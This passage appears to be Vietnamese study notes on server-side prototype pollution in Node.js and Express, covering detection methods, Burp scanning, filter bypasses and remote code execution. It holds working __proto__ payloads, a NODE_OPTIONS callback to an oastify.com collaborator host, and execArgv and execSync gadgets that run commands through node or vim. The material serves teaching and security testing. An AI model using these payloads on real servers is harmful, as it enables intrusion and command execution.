Nếu trang web sẽ bị tấn công thì thuộc tính được thêm vào sẽ xuất hiện trong phản hồi:
```js
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

Khi đã xác định được lỗ hổng prototype pollution, ta có thể tìm kiếm các gadget tiềm năng để sử dụng cho khai thác.
Như: tính năng cập nhật dữ liệu người dùng vì thường liên quan đến việc hợp nhất dữ liệu đến cào một đối tượng hiện có đại diện cho người dùng trong ứng dụng. Nếu có thể thêm một số thuộc tính tùy ý, điều này có thể dẫn tới leo thang đặc quyền.
{: .notice--info}

## Phát hiện prototype pollution server mà không dựa vào phản ánh

Ngay cả khi ta làm ô nhiễm thành công một đối tượng nguyên mẫu phía server, ta sẽ không thấy thuộc tính bị ảnh hưởng được phản ánh trong phản hồi. 

Một cách tiếp cận là hãy thử thêm các thuộc tính phù hợp với các tùy chọn cấu hình tiềm năng của máy chủ. Sau đó, bạn có thể so sánh hành vi của máy chủ trước và sau khi tiêm để xem liệu thay đổi cấu hình này có hiệu lực hay không. Nếu vậy, đây là dấu hiệu rõ ràng cho thấy bạn đã tìm thấy thành công lỗ hổng gây ô nhiễm nguyên mẫu server.

Ta sẽ xem xét 3 phương pháp, các cách này đều không dẫn tới sự phá hủy nhưng vẫn tạo ra sự thay đổi trong hành vi của máy chủ khi thành công

### Ghi đè mã trạng thái
các framework Javascript như Express cho phép các nhà phát triển đặt trạng thái phản hồi HTTP tùy chỉnh. Trong trường hợp đó, máy chủ có thể đưa ra phản hồi HTTP chung, nhưng bao gồm một đối tượng lỗi ở định dạng JSON trong phần nội dung. 

Ví dụ: 
```js
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Mô-đun Nodejs `http-errors` chứa chức năng để tạo loại phản hồi lỗi này:

```js
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status > 400 || status >= 600))) {
        status = 500
    }
    //...
```

ta có thể thấy, dòng `status = err.status || err.statusCode || status`. nếu các nhà phát triển chưa đặt thuộc tính `status` một cách rõ ràng thì ta có thể chèn paylaod prototype pollution vào vị trí này.
:::info
1. Tìm cách kích hoạt phản hồi lỗi và ghi lại mã trạng thái mặc định
2. Làm ô nhiễm nguyên mẫu bằng một status tùy ý. Nên sử dụng mã trạng thái khó hiểu không thể cấp vì những lỗi khác 
3. Kích hoạt lại phản hồi lỗi và kiểm tra xem bạn đã ghi đè thành công mã trạng thái chưa

```yaml
Nên chọn status từ 400-599. Nodejs mặc định là 500 vì vậy sẽ không biết được đã thành công hay chưa.
```
:::

### Ghi đè không gian JSON
Express cung cấp một tùy chọn `json spaces`, cho phép định cấu hình số lượng khoảng trắng được sử dụng để thụt lề bất kỳ dữ liệu JSON nào trong phản hồi.

Các dev thường quên thiết lập điều này.
{: .notice--danger}

Nếu có quyền truy cập vào bất kỳ phản hồi JSON nào, thử ô nhiễm nguyên mẫu bằng thuộc tính`json spaces` , sau đó gửi lại request liên quan để kiểm tra xem liệu độ thụt lề trong JSON có tăng hay giảm không
Đã được fix kể từ Express 4.17.4
{: .notice--danger}

Khi test lỗ hổng này trong Burpsuite thì chuyển response sang dạng Raw để thấy sự khác biệt
{: .notice--info}

### Ghi đè bộ ký tự
Express server thường triển khai một mô-đun `middleware` cho phép tiền xử lý các yêu cầu trước khi chúng được chuyển tới chức năng xử lý thích hợp.

Ví dụ: 
mô-đun`body-parser` thường được sử dụng để phân tích nội dung của các yêu cầu đến để tạo đối tượng `req.body`. Điều này chứa một `gadget` khác mà bạn có thể sử dụng để thăm dò ô nhiễm nguyên mẫu server

Đoạn code dưới đây, chuyển một đối tượng vào hàm `read()` , đối tượng này được sử dụng để đọc trong phần body request để phân tích cú pháp. Một trong các tùy chọn này, `encoding` xác định mã hóa ký tự nào sẽ được sử dụng. Điều này óc thể bắt nguồn từ chính yêu cầu thông qua lệnh gọi hàm `getCharset(req)` hoặc nó mặc định là UTF-8.

```js
var charset = getCharset(req) || 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

Điều này cho thấy, dev đã dự đoán rằng input có thể không chứa thuộc tính `charset` rõ ràng, nên đã triển khai một chuỗi null thya thế. Điều này có thể dẫn tới lỗ hổng.

Nếu bạn tìm thấy một đối tượng có thuộc tính hiển thị trong phản hồi, bạn có thể sử dụng đối tượng này để thăm dò source. 

Ví dụ: sử dụng mã hóa UTF-7 và nguồn JSON.
1. Thêm một chuỗi mã hóa UTF-7 tùy ý vào thuộc tính được phản ánh trong phản hồi. Ví dụ: `foo` trong UTF-7 là `+AGYAbwBv-`

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```

2. Gửi request, máy chủ sẽ không sử dụng mã hóa UTF-7 theo mặc định, do đó, chuỗi này sẽ xuất hiện trong phản hồi ở dạng được mã hóa.
3. Cố gắng làm ô nhiễm nguyên mẫu bằng một thuộc tính `content-type` chỉ định rõ ràng bộ ký tự UTF-7

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
4. Lặp lại request đầu tiên. Nếu làm ô nhiễm thành công, chuỗi UTF-7 bây giờ sẽ được giải mã trong phản hồi.

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```


Trong Nodejs, do một lỗi trong mô-đun `_http_incoming`, điều trên vẫn hoạt động ngay cả khi tiêu đề thực của yêu cầu `Content-type` bao gồm thuộc tính `charset` riêng của nó. Để tránh ghi đề các thuộc tính khi một request chứa các header trùng lặp, hàm `_addHeaderLine()` sẽ kiểm tra xem không có thuộc tính nào tồn tại cùng một khóa trước khi chuyển thuộc tính sang một đối tượng mới
```js
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```
{: .notice--danger}


Nếu đúng như vậy, header được xử lý sẽ bị loại bỏ một cách hiệu quả. Điều này 
{: .notice--success}

## Quét source gây ô nhiễm server
Việc thăm dò thủ công thực sự rất phức tạp, tốn thời gian.

Sử dụng tiện ích BUrp suite:
1. Cài đặt `Server-Side Prototype Pollution Scanner` từ BApp
2. Khá phá web mục tiêu bằng trình duyệt Burp để ánh xạ càng nhiều nội dung càng tốt và tích lưu lượng truy cập trong proxy history
3. Trong Burp, chuyển đến tab Proxy->HTTP History
4. Chuột phải vào request và chọn extension vừa tải
5. Sửa đổi cấu hình tấn công nếu cần, sau đó nhấn OK để khởi chạy trình quét.


Trong BUrp Pro, extension báo cáo bất kỳ source gây ô nhiễm nào mà nó tìm thấy trong bảng sự cố.
Nếu không chắc chắn với kỹ thuật quét nào, nên chọ nQuest toàn bộ để chạy bằng tất cả kỹ thuật có sẵn.
{: .notice--info}

## Bypass bộ lộ input
Các trang web thường lọc từ khóa `__proto__`.
bypass bằng cách:
- làm xáo trộng từ khóa bị cấm `__pro__proto__to__`
- Truy cập nguyên mẫu qua constructor thay vì `__proto__` 


Nodejs có thể xóa hoặc vô hiệu hóa `__proto__` bằng các sử dụng lệnh `--disable-proto=delete` hoặc `--disable-proto=throw`
{: .notice--info}

## RCE via prototype pollution
Tìm hiểu cách xác định các trường hợp có thể xảy ra điều này và cách khai thác trong các ứng udjng Node.

### Xác định một request dễ bị tổn thương
Trong Node có khả năng thực thi một lệnh chìm trong mô-đun `child_process`. 

Cách tốt nhất để xác định những request này là làm ô nhiễm nguyên mẫu bằng paylaod kích hoạt request trả về BUrp colab.

Biến môi trường `NODE_OPTIONS` cho phép xác định một chuỗi các đối số dòng lệnh sẽ được sử dụng theo mặc định bất cứ khi nào bắt đầu một trình Node mới. Ta có khả năng kiểm soát điều này thông qua prototype pollution nếu nó không được xác định.
{: .notice--info}

Một số chức năng của Node để tạo các quy trình con mới chấp nhận một thuộc tính `shell`, cho phép các dev đặt một trình bao (bash) cụ thể để chạy lệnh trên đó.

Kết hợp điều này với thuộc tính độc hại `NODE_OPTIONS`
ta có thể làm ô nhiễm nguyên mẫu theo cách gây ra tương tác với Burp colab bất cư skhi nào trình Node mới được tạo.

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

Bằng cách này ta có thể xác định được một request tạo trình con mới với các đối số dòng lệnh có thể kiểm soát.
{: .notice--success}

### RCE via child_process.fork()

các phương thức `child_process.spawn()` và `child_process.fork()` cho phép tạo ra một quy trình con của Node. 

Phương thức `fork()` chấp nhận một đối tượng tùy ý trong đó có một `gadget` tiềm năng là thuộc tính `execArgv`. Đây là một mảng các chuỗi chứa các đối số dòng lệnh nên được sử dụng khi sinh ra tiến trình con.
Nếu không được xác định trước điều này cũng có nghĩa là ta có thể kiểm soát nó.

Cách này khá mạnh mẽ, nó cho phép tả các mô-đun bổ úng vào môi trường này và sử dụng:
```json
"execArgv": [
    "--eval=require('<module>')"
]
```

Ngoài `fork(), child_process` còn có `execSync()` cho phép thực thi một chuỗi dưới dạng lệnh hệ thống.
{: .notice--success}

### RCE via child_ process.execSync()

Phương thức `execSync()` cũng chấp nhận các đối tượng tùy chọn dẫn tới có thể ô nhiễm nguyên mẫu.
Bạn có thể gây ô nhiễm bằng cách đưa vào 2 thuộc tính `shell` và `input`.

Ví dụ:
```json
"shell":"vim",
"input":":! <command>\n"
```

vim có một lời nhắc và yêu cầu nhập Enter để chạy lệnh được cấp, bypass bằng cách thêm `\n`
{: .notice--info}